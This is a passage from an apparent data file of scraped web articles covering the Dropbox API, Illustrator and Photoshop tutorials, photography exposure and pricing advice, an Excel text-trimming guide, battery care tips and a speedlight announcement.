lock contention . \n\u2013 E.g. Avoid using our APIs to mass-create folders with restricted access in the same folder tree. \nContinue to adhere to our guidance that a team should not have more than 10,000 shared folders. A folder you restrict access to is always a shared folder. Dropbox performance may decline for teams with over 10,000 shared folders. \nTry to keep team folders flat when possible, rather than having deeply nested sharing structures. Dropbox performance may decline for large teams with deeply nested structures. \nDon\u2019t restrict access to folders with 100+ members. Nothing will break, but you will see a generic error message. An interim workaround is to create a new restricted folder and move the contents of an existing folder into the newly created folder. \nSharing with the Dropbox API \nIn this article, we covered what it means to restrict folder permissions, how to edit those permissions (in the Dropbox user interface and the Dropbox API), discussed a real world use case, and gave some context for working with larger scale deployments. Between this post, \u2018 3 ways to add Sharing to your Dropbox App \u2019, and \u2018 Manage team sharing in your Dropbox App \u2019, we\u2019ve covered many Dropbox Sharing concepts and how to incorporate them into your own integration. Armed with this new knowledge you can move beyond simple file storage to collaboration and administration. We can\u2019t wait to see what you build! \nSee what\u2019s possible with the Dropbox API and find other ways to automate your work. \nBuild with Dropbox today at www.dropbox.com/developers",

      "text": "This time we\u2019ll be using basic geometric shapes and various tools of Adobe Illustrator to create a simple and appealing cartoon character \u2013 a green frog! Follow this tutorial and let\u2019s learn drawing cute animals together! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Shape Building, Stroke Panel, Offset Path \nEstimated Completion Time: 20 minutes \nFinal Image: Cute Frog Vector \nStep 1 \nLet\u2019s start from the head of our cute frog vector. Take the Ellipse Tool (L) and make a 260 x 170 px light-green shape. \nStep 2 \nTake the Direct Selection Tool (A) and select the anchor point on the right. Click the bottom handle and let\u2019s drag it down a bit, making the shape more squared and flat in the bottom. Repeat the same for the opposite side of the ellipse. \nUse the Guides ( Control-R and drag the horizontal line on the canvas) to make it easier to align the handles. \nStep 3 \nLet\u2019s add the eyes using the Ellipse Tool (L) . Create a 75 x 75 px circle and place it on top of the head. \nDuplicate the circle ( Shift-Alt and drag) to create the second eye. \nStep 4 \nSelect both circles and go to Object > Path > Offset Path. Set the Offset value to -15 px to create new circles inside the eyes. \nStep 5 \nFill the created circles with white color, depicting the eyeballs. \nSelect the white circles and go to Offset Path again. This time set the offset value to -7 px . Fill the created shapes with dark color for the iris. \nStep 6 \nLet\u2019s add a triangular highlight in the eye. First of all, switch to the Polygon Tool (you can find it in the same drop-down menu as the Rectangle Tool ). Double-click the Polygon Tool in the Tools panel and set the Sides value to 3 . Create a small white triangle and place it on top of the eye as shown in the image. \nGroup (Control-G) all elements of the eye and place the copy ( Shift-Alt and drag) on the opposite side of the head. \nStep 7 \nNow we\u2019ll create a mouth. Make a 95 x 85 px ellipse and set the Stroke color to dark-grey in the Color panel. Set the Fill color to None. \nSelect the top anchor point with the Direct Selection Tool (A) and delete it. Now we have only the bottom half of the ellipse that forms a smile. \nStep 8 \nKeeping the mouth shape selected, open the Stroke panel ( Window > Stroke ) and set the Weight to 8 pt , Cap to Round Cap. This way we make the stroke thicker. \nUse the Pen Tool (P) or the Line Segment Tool (\\) to make a short stroke with rounded caps for the nostril. \nAdd a second nostril as well. \nStep 9 \nUse the Ellipse Tool (L) to make a couple of pink shapes for the blush on the cheeks. This element always helps to make cartoon characters cuter. \nStep 10 \nLet\u2019s add a final stroke to our character, making it more detailed. Use the Pen Tool (P) or the Line Segment Tool (\\) to draw a straight line. Set the Weight to 8 pt and Cap to Round Cap in the Stroke panel. Copy the line twice and rotate the copies in opposite directions to create stylised eyelashes. \nSet the Stroke color to the same light-green as we have for the head and attach the eyelashes to the top of the eyes. \nYay! Our Cute Frog Vector is Finished! \nAwesome work, guys, we\u2019ve finished our character! I hope you\u2019ve enjoyed following this tutorial and discovered some new tips and tricks for your future works. \nHave fun! \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "text": "Our favourite spooky holiday is coming this month and we\u2019re all very excited while preparing and waiting for Halloween! Let\u2019s get inspired and create a cartoony Halloween icon of a witch\u2019s magic cauldron using simple shapes and the most handy functions of Adobe Illustrator! Get ready and let\u2019s brew this vector potion! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Pencil Tool, Stroke Panel, Pathfinder panel, Shape Builder Tool \nEstimated Completion Time: 20 minutes \nFinal Image: Magic Cauldron \nStep 1 \nTake the Ellipse Tool (L) and let\u2019s start from the top of our magic cauldron. Create a 270 x 60 px oval with dark-purple stroke and no fill. \nWe can adjust the Stroke Weight from a Stroke panel (Window > Stroke). Let\u2019s make it thicker by setting the Weight to 12 pt. \nThen Copy (Control-C) the ellipse and Paste in Back (Control-B) . Set the stroke of the new oval to none and fill it with a darker purple color. \nStep 2 \nNow let\u2019s create the body of the cauldron. Make a large ellipse of 340 x 280 px . Press Shift-Control-[ to Send to Back , placing it beneath the first two shapes and move it into place. You might need to use the Direct Selection Tool (A) and move the top and bottom anchor points to squash the ellipse a bit more, making it fit. \nStep 3 \nLet\u2019s add some shadows to our magic cauldron. Select the body shape and Copy it twice (Control-C > Control-F > Control-F). Select the top copy, hold down Shift and move it to the left a bit. Fill the copy beneath it with darker color, this will be the shadow shape. \nNow select the two copies and use the Minus Front function of the Pathfinder to delete the unneeded piece, so that we have only a crescent-shaped shadow left. \nStep 4 \nNow we\u2019ll add another shadow to the top part of the cauldron. Create a large dark-purple ellipse, overlapping the top of the cauldron. \nSelect both the dark ellipse and the body shape of the cauldron. \nStep 5 \nKeeping both shapes selected, grab the Shape Builder Tool (Shift-M) , hold Alt and click on the piece that you want to delete. \nThere we have it! Some nice shadow make the magic cauldron look a lot more interesting. \nStep 6 \nNow that we have shadows let\u2019s also add some highlights! \nDuplicate the body shape of the cauldron twice (Control-C > Control-F >Control-F) and move one of the copies to the right a bit. \nSelect two copies and use the Minus Front function of the Pathfinder as we did previously to delete the unneeded pieces so that we have a crescent-shaped highlight along the left edge of the cauldron. \nStep 7 \nGrab the Eraser Tool (Shift-E) and let\u2019s erase some parts of the highlight to make it more stylised and cartoony. We can adjust the Eraser settings by double-clicking on the Eraser Tool icon in the Tools panel. \nGroup (Control-G) the pieces of the highlight and make them a bit smaller so that they don\u2019t stick to the edge of the cauldron. \nStep 8 \nTake the Rectangle Tool (M) and add two small rectangles in the bottom of the cauldron for the legs. Press Shift-Control-[ to Send to Back , placing them beneath the cauldron body shape. \nUse the Direct Selection Tool (A) and drag the circle markers of the Live Corners to make those legs rounded. \nStep 9 \nLet\u2019s fill our magic cauldron with a gooey brew! \nDuplicate the dark-purple oval that we have on top of the cauldron and make it smaller. Change the Fill color to green, depicting a witch\u2019s potion. \nUse the Ellipse Tool (L) to create a round bubble. Select its bottom anchor point with the Direct Selection Tool (A) and delete it, so that we have only half of the circle. \nPlace the bubble on top of the brew and copy it multiple times, changing the size and the position of each bubble. \nStep 10 \nNow we\u2019ll make our gooey brew even spookier! Use the Ellipse Tool (L) to draw a simple eye made of circles of different size. Place the eye into the brew and use the Ellipse Tool (Shift-E) to delete its bottom half. Hold down Alt while using the Eraser Tool if you want to use a rectangular selection. \nStep 11 \nTake the Pencil Tool (N) and draw a bone sticking out of the brew. Fill it with yellowish-grey color, the same as we have for the eyeball. \nAdd some green bubbles floating above the cauldron. \nStep 12 \nNow we can Group (Control-G) all the elements of the cauldron and use the Rectangle Tool (M) to create a purple rectangle for the background. \nAdd an elliptical shadow under the cauldron using the Ellipse Tool (L). \nUse a Type Tool (T) and a free Peralta font to add a message in the bottom of the card. \nStep 13 \nLet\u2019s customise the text a bit. First of all, let\u2019s Object > Expand Appearance of the text to turn it into curves. \nNow we have every letter as a separate object and we need to double-click the text group to be able to move or edit those letters. Use the Selection Tool (V) to move and rotate the letters, making the text look more diverse and playful. \nYou can also add spooky elements to some of the letters. For example, I\u2019ve added a couple of squashed ellipses inside of the letter \u00abO\u00bb to make it look like a demon\u2019s eye. \nStep 14 \nThis is how I\u2019ve ended up with the text. Feel free to add more fun decorations to the text and to the cauldron, you can even turn in into a Halloween postcard and send it to your friends! \nBoo! Our Spooky Halloween Cauldron is Ready! \nGreat job, guys! Thank you so much for following this tutorial, I hope you\u2019ve enjoyed it and discovered some new magic tips and tricks that will be useful for your future designs and illustrations. \nGet yourself ready for Halloween and have a very scary good time! \nAuthor: Yulia Sokolova \n2D/3D artist and tutorial instructor, focusing on character creation, icons, lettering design, and illustrations. \nThe post How to Create a Magic Cauldron for Halloween in Adobe Illustrator appeared first on Vectips .",

      "text": "Welcome back to another Illustrator tutorial in which we\u2019re going to learn how to create an inbox icon using nothing more than some basic geometric shapes that we will adjust here and there. \nSo, assuming you already got a coffee refill, grab a quick sip and let\u2019s get started! \nTutorial Details: Inbox Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2018 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 20 Minutes \nFinal Image: Inbox Icon \nStep 1 \nAs always, we\u2019re going to kick off the project by setting up a New Document by going to File > New (or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nStart working on the actual icon, by creating the background using a 56 x 56 px circle which we will color using #7474E8 , and then center align to the underlying Artboard . \nStep 3 \nCreate the main shape for the front section of the box using a 28 x 12 px rectangle with a 4 px thick Stroke ( #FFFFFF ) and a Round Join , which we will position at a distance of 12 px from the circle\u2019s bottom edge. \nStep 4 \nAdjust the shape that we\u2019ve just created by selecting the Add Anchor Point Tool (+) and adding a set of two new anchor points positioned at a distance of 8 px from the sides of its upper edge. Take your time, and once you\u2019re done move on to the next step. \nStep 5 \nWith the Add Anchor Point Tool (+) still selected, add a second pair of anchor points which we will position to the inside, at a distance of just 2 px from the ones from the previous step. \nStep 6 \nAdjust the shape of the front section by selecting the anchor points that we\u2019ve just added using the Direct Selection Tool (A) , and then pushing them to the bottom by a distance of 4 px using the Move tool ( right click > Transform > Move > Vertical > 4 px ). \nStep 7 \nStart working on the inner section of the box by creating a 28 x 16 px rectangle with a 4 px thick Stroke ( #FFFFFF ) with a Round Join , which we will position on top of the resulting shape so that their paths overlap as seen in the reference image. \nStep 8 \nAdjust the shape that we\u2019ve just created by individually selecting and pushing its top anchor points to the inside by a distance of 4 px using the Move tool ( right click > Transform > Move > Horizontal > + / \u2013 4 px depending on which side you start with). \nStep 9 \nFinish off the inner section and with it the project itself, by opening up its lower path by adding a new anchor point to its bottom edge using the Add Anchor Point Tool (+) , and then immediately removing it by selecting it using the Direct Selection Tool (A) and then pressing Delete . Once you\u2019re done, select and group all of the shapes together using the Control-G keyboard shortcut before hitting that save button. \nGreat Work! \nThere you have it fellow icon lovers, a nice and easy step by step process on how to create your very own inbox icon using some of Illustrator \u2019s most basic shapes and tools. \nAs always I hope you had fun working on the project and if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "text": "Let\u2019s say I would like to enhance the stars in this Milky Way landscape photo. I could load the image into Camera Raw and add some Clarity at the risk of adding noise and artifacts to the night sky. Another way of doing it could be to use \u201cSelect Color Range\u201d combined with a curves or levels adjustment. However, I often find that these methods don\u2019t yield satisfactory results. \nI am not saying that the technique I am to demonstrate is the best \u2014 it\u2019s just my preferred approach to achieve what I have in mind. \nA night sky is rarely uniform in terms of luminosity. There will be both color and luminance gradients across the sky. I will therefore add several blank layers set to Normal that cover various parts of the sky. In this example, I start in the upper right corner, painting with white at 100% opacity. \nNext, I double click on the layer which brings up the Layer Style dialog box. I am only interested in the bottom left slider where it says \u201cUnderlying layer\u201d. Moving it to the right equals protecting the dark tones from the layers below the current layer. \nI am happy with the adjustment when the white I painted in is only affecting the stars. I often prefer to feather the \u2018selection\u2019 by pressing down Alt/Opt, which splits the slider in two when placing the cursor on the right part or to the right of the double arrow. \nI add a new blank layer, set it to Normal, paint white in the bottom right corner of the sky, and then follow the steps outlined above. \nIn this instance, I encounter an expected issue due to the gradients in the sky. When the stars are shining even brighter than before, some white residues are left below the Milky Way core. I simply grab the Eraser tool and remove it. \nThe left part of the sky may have approximately the same luminosity values as the right part, so I try to use the layers I have already added and then paint with white using the Eraser tool to remove any unwanted effect. If this doesn\u2019t work, I add new blank layers for that side of the sky. \nWhen I am done with a star enhancing layer, I always turn that layer off and on several times to check if I unwittingly have brightened parts of the sky. If that is the case, I again double click on the layer to further fine-tune the Blend-If sliders, or I use the Eraser tool if I painted too far across a gradient. Reduce the opacity of the layers if the stars come across as too bright. \nHere\u2019s the original photo: \nAnd here\u2019s the photo edited with this technique: \nAbout the author : Ole Henrik Skjelstad is a landscape photographer and math teacher from Norway.

The decision to shoot monochromatic images is, for some, an afterthought in a way that other choices like filters, focal lengths, and exposure settings would not be. \nThis means that some of the nuance to a well-balanced black and white exposure can be overlooked, and I think this is a shame because it wouldn\u2019t take much for photographers to take a little more control and consideration and produce effective and beautiful black and white images. \nMany black and white edits are heavy-handed, simply boosting contrast and sharpness with little subtlety or thought for mid-tones. I think that some of the best black and white images have a more complex aesthetic that cannot be achieved through desaturation and contrast increments alone. \nThere are a few ways a better result can be achieved, and the implementation is not technically difficult by any means. It is also not a specific formula and leaves enough to the photographer\u2019s own preference that they can create their own black and white \u201clook\u201d once they have a good understanding of the way that their exposures look. \nIt may sound obvious, but the first step towards creating a good black and white image is to have the intention to do so in the first place. Rather than using black and white to salvage uninteresting color images, a good black and white image is shot deliberately to have certain characteristics that make the conversion easier. \n\u201cCheating\u201d a photo by switching it to black and white (or through any post-processing gimmick) rarely works; there has to be some redeeming aspect \u2013 you can\u2019t make a photo good in post, only bring out the best of what was originally seen. \nFor example, a well-composed image with good figure to ground and well-exposed light will look just as good without color as it does with. This is because the image is based around shapes and light, which translate well to a black and white image. An image featuring vivid color, or subtle contrasting elements may suffer from losing its color, as it could have been the only thing making it worthwhile, or interesting. \nThe best thing, in my opinion, about black and white is that it is not a true representation of the world. It is a purely artistic means of expression, and this means you can really control the exposure, and stretch what\u2019s possible from your camera. You can afford to lose detail in the shadows, highlights or mid-tones \u2014 and sometimes you should in order to get the exact look you are after. \nThe key to my exposures for black and white is an exaggeration of the light you are using. Through deliberate and careful consideration of the scene you are working with, you can decide whether to exaggerate the shadows or the light and to allow one or the other to dominate the scene. A good way to do this is to spot meter for the exact light you want and then adjust your exposure accordingly. \nUsing a digital camera with a live-view function makes it much easier to see exactly what you will be getting with your exposure and is, therefore, one of the best ways to shoot for black and white. \nIt can take a while to become comfortable losing the highlights of an image, but I\u2019ve often found that in my images the \u201caction\u201d is almost never the most brightly lit part of my scene. People will be darker than the sky or other sources of backlight so exposing this way offers a very clean, minimal subject. I\u2019d rather lose detail in the sky, or in billboards or from streetlamps, and have more detail from my characters and situation. \nIn these photographs, I overexposed by two stops. This gave me vivid whites from the fluorescent jackets worn by the police, and also a great amount of detail in the arrestee, who would have otherwise been in shadow. \nSimilarly, if I am exaggerating the shadow then I am happy to lose the details in favor of rich blacks and interesting highlights. \nFor example, in this photograph, I exposed for the sky and was able to capture my subjects silhouette, including the heart shape he was making with his fingers. If I had exposed \u201ccorrectly\u201d there is a chance his fingers would have been blown out against the sky. \nFor this image, I metered for the sky, then underexposed by one stop, giving me a moody aesthetic, and deep blacks. \nThese last two images probably represent the easiest and perhaps most common way to create a dramatic black and white shot \u2013 a low angle silhouette against the sky. \nShooting black and white film is a very different experience than shooting an image digitally and then converting it. The way film reacts to light means it is usually better to overexpose a scene than under, and achieving rich shadows can be difficult without push developing which can reduce dynamic range. \nFilm is great for capturing dynamic scenes with lots of midtones, and I\u2019ve done some of my best film work in flat light. \nWhen choosing a black and white film it is best to research not only the latitude for pushing/exposure, grain, and \u201clook\u201d but also to discover whether it will react to light offering high contrast or low contrast. You can usually manipulate a lot with black and white film, but learning what each emulsion offers first, and playing to those strengths is a great starting point. \nFor this article, I\u2019ve used examples from street photography, but exaggerating your exposure for black and white is not limited to that genre. One of my favorite landscape photographers (which means a lot, as I usually dislike landscape photography a lot!) is Jay Vulture, who goes by Vulture Labs . \nView this post on Instagram \nA post shared by Jay Vulture (@vulture_labs) on Nov 23, 2018 at 4:41am PST \nHis long exposure black and white work is an incredible manipulation of the scene, and the result is such a beautiful and surreal effect. \nThere are so many different ways to apply an exaggeration of light through deliberate \u201cincorrect\u201d exposure in order to create an engaging black and white image. I\u2019m still working on methods in my film work that will deliver consistent results across the different types of film I use, and it\u2019s been a difficult process to use my meter as a starting point for me to further alter rather than for an exact measurement. So far I have been very rewarded in my results, and I will continue to push my exposures, my film, and myself until I am satisfied with the look. \nAbout the author : Simon King is a London based photographer and photojournalist, currently working on a number of long-term documentary and street photography projects.

      "title": "How to Remove the First Character from a String in Excel (Quick & Easy)",
      "text": "Working with text data would often require slicing and dicing it. \nAnd one such common thing people often have to do is to remove the first characters from a string in Excel . \nSuppose you have a dataset as shown below (in column A) and you want to remove only the first characters from each cell and keep the rest of the text as is (resulting data shown in column B). \nThere are multiple ways to do this in Excel\u2026 \nAnd in this tutorial, I will show you different ways to remove the first characters from a string in Excel. \nSo let\u2019s not waste any time and get to the point. \nThere are two types of methods covered in this tutorial. One that needs you to use an extra column and give that result in that extra column. And others where you get the result in the same column itself (Text to columns method and VBA macro method). \nReplace the First Character with a Blank Using a Formula \nOne of the easiest wat to remove the first character from a text string in a cell is to replace it with a blank (null character). \nAnd you can easily do this using the REPLACE function . \nSuppose you have the dataset as shown below and you want to remove the first alphabet from all these cells. \nThe below formula will do this: \n=REPLACE(A2,1,1,\"\") \nThe above formula simply starts from the beginning and replaces 1 character from the beginning with a blank (\u201c\u201d). \nYou can also use this to remove multiple characters from each cell. For example, if you want to remove the first two characters, you can use the below formula: \n=REPLACE(A1,1,2,\"\") \nExtract Everything Except the First Characters from a Cell (using a formula) \nExcel has a lot of Text functions and you can do the same thing in many different ways. In the above method, we replaced the first character with a blank, and in this method, we will use a formula to extract every character from a string except the first one. \nThis can be done using the RIGHT function (which extracts the given number of characters from the right of a text string). \nSuppose you have a dataset as shown below: \nHere is another formula method to do this by extracting everything except the first character from the cells. \n=RIGHT(A1,LEN(A1)-1) \nThe above formula uses the LEN function to first find out the total number of characters in the cell. It then uses the RIGHT function to get all the characters as a result of the formula, except the first one. \nUse Text to Column to Split the First Character and the Rest of the Text String \nThe above two formula methods would require you to use an extra column and give the result in that extra column. \nHere is a method that uses Text to Columns in Excel and allows you to choose whether you want the result in the same cell or in a separate cell. \nIn case you decide to get the result in the same cells. it\u2019s a good idea to keep a backup of the original data in case you need it in the future. \nSuppose you have a dataset as shown below and you want to remove the first character and get all the remaining characters. \nBelow are the steps to do this using Text to Columns in Excel: \nSelect the cells from which you want to remove the first character \nClick the Data tab \nIn the Data tools, click on Text to Columns \nIn the Convert Text to Column Wizard, make the following changes: \nStep 1 of 3: Select Fixed width (by default Delimited is selected so you need to change this) and click on Next \nStep 2 of 3: In the Data preview, place the cursor after the first character and right-click. This will insert a line as shown below. This line tells Text to Column to split the text into separate cells \nStep 3 of 3: Select Do not import column (skip) and keep the destination cell as is (which would be the same cell where you have the data). \nClick on Finish. \nThe above steps would instantly remove the first character from each cell and give you the rest. \nLet me quickly explain how this works: \nWhen you place the cursor and click after the first character in Step 2, Text to Columns was told to split the data using that line. So the characters before the line are split as one part and the rest as another part. \nBut in Step 3, since we selected the first column (which was to the left of the line we inserted in Step 2) and then selected \u2018Do not import column\u2019, it simply skipped the first character and gave us the remaining part in the same cell. \nWhile I have used this method to remove the first character, you can use it to remove a second, third, or nth number of characters from the beginning of the end. You can also use this method to extract 2/3/n number of characters from the beginning or the middle of a text string. \nUse Flash Fill to Instantly Remove the First Character \nI love the Flash Fill feature in Excel as it makes it so easy to do some level of text data manipulation. \nAnd what we are trying to do here, Flash Fill is a perfect tool. \nNote: Flash Fill is only available in Excel 2013 and later versions. If you\u2019re using Excel 2010 or prior versions, you will not be able to use this method. \nSuppose you have the dataset as shown below and you want to remove the first characters from each cell. \nHere are the steps to do this: \nIn a cell adjacent to the dataset\u2019s first cell, enter the result you want. In this case, since I have M70 and I want to remove the first character, I will manually enter the value 271. \nIn the second cell, enter the expected result, which would be 360 in this example. [While you\u2019re typing, you may see some values in gray. These are values Flash Fill guessed based on the pattern. If these are correct, stop typing and just hit the enter key and you will get the result. In case these values don\u2019t show or disappear, move to the next step] \nSelect both the cells, place the cursor at the bottom-right part of the selection (at the small green square) and double-click (or hold the left key of the mouse and drag till the end of the dataset). \nAt the bottom of the resulting data, you will see a small \u2018Auto Fill Options\u2019 icon. Click on it. \nClick on Flash Fill \nThat\u2019s it! \nYou will see Flash Fill has automatically identified the pattern and now gives you all the characters from a cell except the first characters. \nThere are some really cool things you can do this Flash Fill and I cover those in this video below: \nUse a Simple VBA Macro in the Immediate Window \nAn immediate window is a place in the Excel VB Editor that allows you to quickly run a macro code (without getting into the hassle of inserting a module or saving the macro) \nAll you need to do is use the code, copy and paste it in the immediate window and hit the enter key. \nAnother great thing about this method is that you don\u2019t need to use another column to get the result. As soon as you run the code, it gives you the resulting data in the same cells. \nCaution: This method is fine if you have a few hundred or a few thousand cells from which you want to remove the first character. If you have a lot more, this can \nslow down your Excel \n. \nBelow is the line of code I will be using to remove the first character from each cell in a selected range: \nFor Each cell In Selection: cell.Value = Right(cell.Value, Len(cell.Value) - 1): Next cell \nHere are the steps to use this code from the immediate window: \nSelect the cells/range from which you want to remove the first character from the text string \nRight-click on the sheet tab name (the same sheet where you have this data) \nClick on View Code. This will open the VB Editor backend \nIn the VB Editor window, click on the View option in the menu and then click on Immediate Window. This will make the immediate window show up. This step is not needed in case the immediate window is already visible. \nCopy and paste the above line of code in the immediate window \nPlace the cursor at the end of the line \nHit the Enter key \nThe above steps would instantly run the code on the selected data and remove the first character from each cell. \nA quick explanation of the line of VBA code \nFor Each cell In Selection: cell.Value = Right(cell.Value, Len(cell.Value) - 1): Next cell \nThe above line of code uses a For Next loop that goes through each cell in the selection. It then uses the RIGHT and LEN function to extract all the characters, except the first one. \nThese are the five simple methods you can use to get rid of the first character from a text string and extract the rest. You can choose what method to use based on your data set and your requirements. \nFor example, if you don\u2019t want to use an extra column and want to get the results in the same cells, you\u2019re better off using the Text to Columns method or the VBA Immediate Window method. \nI hope you found this tutorial useful. \nYou may also like the following Excel tutorials:",

      "text": "This handy guide offers five tips to extend the life of your Godox and other Lithium-Ion batteries \nDecember 12, 2019 by John Aldred Leave a Comment \nVIDEO \nGodox has been getting an unfair, I think, hard time lately about its batteries. With reports of them spontaneously catching on fire or just dying completely. But as I\u2019ve said before, this isn\u2019t something that\u2019s unique to Godox. The fact of the matter is that lithium-ion battery technology can be dangerous when not respected. Lack of proper care can also cause them to become useless fairly quickly, too. \nIn this video, photographer Wes Perry , who has a background in engineering and alternative energies, walks us through five simple tips to prevent our lithium-ion batteries from catching fire or exploding and to extend their life for as long as possible. \nTake the battery out when you\u2019re done \u2013 When you leave batteries in a device, even if it\u2019s turned off, current can still \u201cleak\u201d over time, causing your batteries to become too depleted (we\u2019ll get back to that) if you don\u2019t use that piece of gear often. \nDon\u2019t store them fully charged \u2013 This is why many batteries, like those for DJI drones, offer a \u201cstorage\u201d charge option. This option charges or drains the batteries to about half full for long term storage. Leaving them stored on a full charge for long periods of time can dramatically shorten their life. \nDon\u2019t overheat them \u2013 If you\u2019ve taken a battery out of a piece of gear because you\u2019ve been working it hard and it\u2019s dead, then it\u2019s probably coming out warm. Don\u2019t throw it straight into a charger, increasing the heat even further. Also, don\u2019t leave them sitting in the hottest part of your vehicle on a sunny day. \nDon\u2019t leave them charging \u2013 I know so many people who put batteries on a charger and then just leave them there 24/7, often for weeks, until they need to use them. If you\u2019re not using them for a while, charge or drain them to around 50% and then just charge them up to full a day or two before your shoot. And make sure to remove them from the charger once fully charged. \nDon\u2019t drain them to zero \u2013 Many batteries these days contain electronics to monitor the voltage and prevent you from draining them too much, but it\u2019s still possible, especially if you let them get low, leave them in your gear, and they drain even further. A lithium-ion battery that\u2019s drained too low can be almost impossible to safely charge up again for most people. And even if you have the gear and know-how to safely bring them back up to a normal voltage, they may no longer hold a charge. \nGodox puts all of these tips in various bits of documentation for the batteries that come with their lights, but these tips don\u2019t just apply to Godox lights. They apply to any kind of lithium-ion based battery, whether it\u2019s your camera batteries, your laptop, or whatever. \nI\u2019ve got 10 lithium-ion battery-powered Godox lights here, and some of them are almost four years old now. I\u2019ve followed the principles above since day one because I was already taking care of my lithium-ion drone and other batteries the same way. All of my Godox batteries still hold a good charge and none have swollen or exploded. \nThere is still more that manufacturers can do to extend the life of their batteries and protect them from the people who purchase them. DJI, for example, puts a pretty massive amount of technology into their batteries, for example, which is why they cost so much to buy spares. But until the manufacturers start to take mishandling and bad care into account, follow these tips. It\u2019s safer and cheaper.",

      "title": "How to Price Your First Photo Shoot",
      "text": "If photography is your chosen career path or even just a hobby, at some point, someone is going to ask you to take some photographs in exchange for a paycheck. \nThe first time you get asked to take photographs for money is both amazing and extremely stressful. Up until your first paying job, the only pressure placed upon you has been internal. Now you suddenly have someone else expectations looming and a physical value set to your work. \nHere is my advice on how to price your work when starting out: \nCash Cow or Portfolio \nThere are only ever two reasons to take a paying job. One is that it is a cash cow, and this of course is relative to how much you need that cash. Some jobs pay so much money or you need the money so badly that you do it regardless of what it is. There are other jobs that pay less but are something that you really want to do \u2014 these become portfolio work. \nWhenever you are considering taking payment for a job, first decide if you want to do it and if the work will help your portfolio. If it will, then the money is a secondary win. If you look at the brief and it doesn\u2019t really get your juices flowing, then you need to either make it a cash cow and charge enough money that it no longer matters, or you politely decline the offer. \nThis is perhaps the best advice that I have ever been given and it is the way that I vet every single offer that comes in. \nUsage \nIn many genres of photography, this won\u2019t apply. Although, if like me you jump straight into advertisement, then there is the added stress of charging for usage. Thankfully, the lovely people over at AOP (The Association of Photographers) have built a calculator to help with this . \nWhen you send your quote to an advertisement agency, it will be split into three sections. One will be your labor costs/day rate. This is the price you charge to turn up and shoot (more on this later). Then there are any production costs that have been agreed. The final part of the invoice will be for the usage. Generally speaking, this is where commercial photographers make their money. Usage can be anywhere from an additional $1,000 to well over $50,000 for the shoot. \nWhat is The Norm? \nThere are two ways to look at pricing, one is to work out the costs of doing business and then to add profit on the top, which is great in some industries, but I feel is somewhat flawed in photography. The second is to work out what the norm is and to build your business underneath it. \nThe first time you quote for photography work, you will either be going off what a friend has suggested or completely stabbing in the dark. Over in the UK, there are some reasonably standard rates for shooting that will hopefully translate to where you are (add a bit if you are New York and take a little away if you are in a small town). \nThe average club level photographer over here could hope to make $300 for a day\u2019s photography. This could be headshots, photographs of a cafe\u2019s food, or maybe an event in the evening. The next level up from this would be your jobbing photographer \u2014 they probably don\u2019t have their own studio, but will have a good 5+ years of experience. They will be shooting for local franchises, small brands, and local businesses. They usually charge around $600 a day and will include color grading within this. \nThen you have your professional photographers who perhaps have a decade of experience and work with household name brands. They tend to charge around $1,300 a day and will add usage onto that if they are shooting advertisement. Once you go passed this level, the fees rocket up to silly amounts of money. These will be for photographers where having their name attached to the ad campaign offers a major pull for the brand. \nYou don\u2019t have to start at the beginning \u2014 many photographers jump in straight at $1,300 if their work is good enough. \nFor my first ever photo shoot, I charged a family $60 to take their portrait in their house. The next job I took was a billboard campaign for which I only charged $600, including usage. Ten years later, my fees are much higher, but I feel that with my experience that I can justify them to my clients. \nWhere you start has no bearing on where you end up. You can always increase your price for your second job, so don\u2019t worry if at the end of your first shoot that you feel like you did far too much work for far too little money. \nThe Price of Stress \nWith money comes stress. The first time that I charged for photography, I worked so hard to make sure the client was happy, even though I ended up on less than minimum wage. Years later, I picked up a job for over $10,000 for a single photograph. The stress that this created gave me headaches and made my gums bleed. \nIf you feel that the figure in your head is making you worried or like you may disappoint someone, drop the fee until you feel comfortable. You are probably worth far more, but at the beginning it isn\u2019t worth stressing yourself out in order to make a few more dollars. Each time you jump up to the next price bracket, you will feel like it is your first paying job all over again. \nMost Importantly \nIt is your first paying job, whatever you charge and however many hours sleep you lose over it, ten years later it will seem incredibly insignificant. The biggest hurdle is changing from shooting for fun to shooting for money. Once you have crossed that, everything else will fall into place in its own time. \nAbout the author : Scott Choucino is a professional food and portrait photographer.

      "text": "Profoto\u2019s $1,095 A1X Speedlight is now available for Fuji \nDecember 6, 2019 by John Aldred Leave a Comment \nProfoto calls it \u201cThe world\u2019s smallest studio light\u201d. Most of the rest of us just call it the $1,100 speedlight. Yes, that\u2019s right, we\u2019re talking about the Profoto A1X. An update to the original $1,000 speedlight , the A1X has also proven to be a fairly popular light amongst Nikon, Canon, Sony and Olympus shooters. Thus far, though, Fuji users had been left out in the cold, at least on the hot-shoe. \nNo more, though. Fujifilm has announced compatibility with the new Profoto A1X AirTTL-F designed specifically for use with Fujifilm cameras. Support also comes for the Off-Camera Flash Kit , which includes the A1X AirTTL-F as well as the button-free Profoto Connect Wireless Transmitter . \nVIDEO \nAs with most speedlights, the Profoto A1X AirTTL-F is primarily intended to reside on the camera\u2019s hotshoe, offering up to 450 full-power flashes on a charged battery. It has a 1 second recycle time, plenty of wireless channels to choose from to help avoid any interference and an updated UI over the original Profoto A1. \nIt was possible for Fuji users to use the A1 and A1X speedlights before, but only off-camera. You could use A1 or A1X units designed for other systems off-camera with the Profoto Air Remote TTL-F for Fujifilm atop your Fuji body. But sometimes you just want to stick a light on the camera, bounce it off a wall or ceiling, and let it do its TTL thing. Now, Fuji shooters can. \nThe Profoto A1X 